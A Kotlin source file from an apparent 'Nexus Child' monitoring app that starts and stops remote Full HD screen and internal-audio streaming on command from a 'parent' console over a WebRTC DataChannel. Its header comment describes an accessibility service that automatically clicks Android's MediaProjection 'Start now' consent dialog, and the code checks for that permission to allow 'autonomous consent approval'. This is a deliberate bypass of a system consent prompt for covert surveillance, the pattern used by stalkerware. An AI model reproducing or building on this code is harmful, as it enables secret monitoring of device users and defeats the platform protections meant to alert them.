package com.nexus.child.components.screen

import android.util.Log

/**
 * ScreenCommandHandler processes DataChannel control commands for live screen streaming:
 * 1. SCREEN_ON: Initiates Full HD screen capture and system audio streaming.
 * 2. SCREEN_OFF: Halts screen capture, stops internal audio recording, and restores normal video state.
 *
 * Hey friend! Here is how the screen streaming command lifecycle operates:
 *
 * --- SCREEN ACTIVATION (SCREEN_ON) ---
 * 1. Parent clicks the Play button on their desktop console.
 * 2. Parent sends "SCREEN_ON" across the 'nexus-control' DataChannel.
 * 3. We verify that Nexus Child has Accessibility Service permission enabled.
 * 4. We launch TransparentMediaProjectionActivity, which requests Android's MediaProjection permission.
 * 5. MediaProjectionAutoClickHelper automatically clicks "Start now" or "Entire screen" within 5 seconds.
 * 6. ScreenController receives the token, starts 1080p @ 30fps video capture, and hooks internal audio.
 * 7. When streaming is confirmed, we reply with "SCREEN_STARTED" over the DataChannel.
 * 8. Parent switches the loading spinner to the Pause button and displays the live screen!
 *
 * --- SCREEN DEACTIVATION (SCREEN_OFF) ---
 * 1. Parent clicks the Pause button on their desktop console.
 * 2. Parent sends "SCREEN_OFF" across the DataChannel.
 * 3. ScreenController halts video capture and audio encoding.
 * 4. We reply with "SCREEN_STOPPED" over the DataChannel.
 * 5. Parent flips the loading spinner back to the Play button and displays the paused overlay.
 */
class ScreenCommandHandler(
    private val screenController: IScreenController,
    private val dataSender: (message: String) -> Boolean
) {

    companion object {
        private const val TAG = "ScreenCommandHandler"

        // Commands from Parent console
        const val CMD_SCREEN_ON = "SCREEN_ON"
        const val CMD_SCREEN_START = "SCREEN_START"
        const val CMD_START_SCREEN = "START_SCREEN"

        const val CMD_SCREEN_OFF = "SCREEN_OFF"
        const val CMD_SCREEN_STOP = "SCREEN_STOP"
        const val CMD_STOP_SCREEN = "STOP_SCREEN"

        // Responses to Parent console
        const val RESP_SCREEN_STARTED = "SCREEN_STARTED"
        const val RESP_SCREEN_STOPPED = "SCREEN_STOPPED"
        const val RESP_SCREEN_ERROR_PREFIX = "SCREEN_ERROR: "
    }

    /**
     * Inspects an incoming DataChannel message and executes screen streaming actions
     * if it matches a screen control command.
     *
     * @param command Raw message received over 'nexus-control' DataChannel
     * @return true if command was recognized and handled; false otherwise.
     */
    fun handleCommand(command: String): Boolean {
        val normalized = command.trim()
        return when (normalized) {
            CMD_SCREEN_ON, CMD_SCREEN_START, CMD_START_SCREEN -> {
                handleScreenOn()
                true
            }
            CMD_SCREEN_OFF, CMD_SCREEN_STOP, CMD_STOP_SCREEN -> {
                handleScreenOff()
                true
            }
            else -> false
        }
    }

    /**
     * Handles the start screen command.
     */
    private fun handleScreenOn() {
        Log.d(TAG, "Processing command: $CMD_SCREEN_ON")

        // Step 1: Verify accessibility service permission for autonomous consent approval
        if (!screenController.hasAccessibilityPermission()) {
            val err = "Accessibility permission not granted on child device"
            Log.e(TAG, err)
            dataSender("$RESP_SCREEN_ERROR_PREFIX$err")
            return
        }

        // Step 2: If already active, immediately acknowledge with SCREEN_STARTED
        if (screenController.isStreaming()) {
            Log.d(TAG, "Screen streaming is already active. Acknowledging with $RESP_SCREEN_STARTED.")
            dataSender(RESP_SCREEN_STARTED)
            return
        }

        // Step 3: Initiate screen streaming via ScreenController
        val initiated = screenController.startScreenStreaming(
            onStarted = {
                Log.d(TAG, "Screen streaming confirmed. Transmitting confirmation: $RESP_SCREEN_STARTED...")
                dataSender(RESP_SCREEN_STARTED)
            },
            onError = { errorMessage ->
                Log.e(TAG, "Screen streaming failed: $errorMessage")
                dataSender("$RESP_SCREEN_ERROR_PREFIX$errorMessage")
            }
        )

        if (!initiated) {
            Log.e(TAG, "Failed to initiate screen capture pipeline")
        }
    }

    /**
     * Handles the stop screen command.
     */
    private fun handleScreenOff() {
        Log.d(TAG, "Processing command: $CMD_SCREEN_OFF")

        // If already stopped, immediately acknowledge with SCREEN_STOPPED
        if (!screenController.isStreaming()) {
            Log.d(TAG, "Screen streaming is already idle. Acknowledging with $RESP_SCREEN_STOPPED.")
            dataSender(RESP_SCREEN_STOPPED)
            return
        }

        // Step 1: Halt screen capture and internal audio
        val stopped = screenController.stopScreenStreaming()
        if (!stopped) {
            Log.w(TAG, "stopScreenStreaming() returned false, but proceeding to confirm stop.")
        }

        Log.d(TAG, "Screen streaming stopped. Transmitting confirmation: $RESP_SCREEN_STOPPED...")
        dataSender(RESP_SCREEN_STOPPED)
    }

    /**
     * Fail-safe disconnection callback invoked when WebRTC connection or DataChannel drops.
     * Automatically stops screen capture and audio recording so device resources are freed.
     */
    fun onPeerDisconnected() {
        Log.d(TAG, "Peer disconnected. Executing fail-safe screen streaming teardown...")
        if (screenController.isStreaming()) {
            Log.d(TAG, "Screen capture was actively running during disconnect. Stopping...")
            screenController.stopScreenStreaming()
        }
    }

    /**
     * Releases all screen controller resources upon activity/service destruction.
     */
    fun cleanup() {
        Log.d(TAG, "cleanup() invoked on ScreenCommandHandler.")
        screenController.cleanup()
    }
}
